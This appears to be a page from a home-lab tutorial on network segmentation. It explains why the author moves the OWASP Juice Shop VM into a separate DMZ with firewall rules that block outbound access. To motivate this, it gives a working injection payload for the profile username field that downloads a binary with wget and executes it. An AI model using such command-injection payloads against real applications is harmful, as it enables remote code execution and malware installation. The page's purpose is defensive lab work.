---
title: 01 Why DMZ?
type: docs
---

User `hacker` VM to exploit the [malware vulnerability](https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html#_infect_the_server_with_juicy_malware_by_abusing_arbitrary_command_execution).

Get `juiceshop` to download a malware file from the internet.

Use a vunerability in the user input for editing your profile at `http://juiceshop/profile` by entering this in the username:
```
#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/juice-shop/juicy-malware/raw/master/juicy_malware_linux_amd_64 && chmod +x malware && ./malware')}
```

This will download a "malware" file to the `/opt/juice-shop` directory on `juiceshop` and execute it.

Because the `juiceshop` VM is in the `LAN` network, there are few restrictions to what it can do. Like the `sysadmin` VM, it can access the `WAN` (or `default` virtual network). So it can download files from the internet. There are times when outbound internet access is necessary, like updating or installing software for the web app. But it doesn't require it to function as a web app for users to order products.

So I'll create a more restrictive `DMZ` with firewall rules stopping it from accessing outside of the network. I could create host-specific firewall rules for the `LAN` network that apply to `juiceshop` and not `sysadmin`. But you would also need rules to restrict access from `juiceshop` communicating with other machines in the `LAN`. I think it's simpler to have a seperate interface for publicly accessible servers like `juiceshop`. If there other other servers in the future, they can be added to the same `DMZ` without requiring more host-specific firewall rules.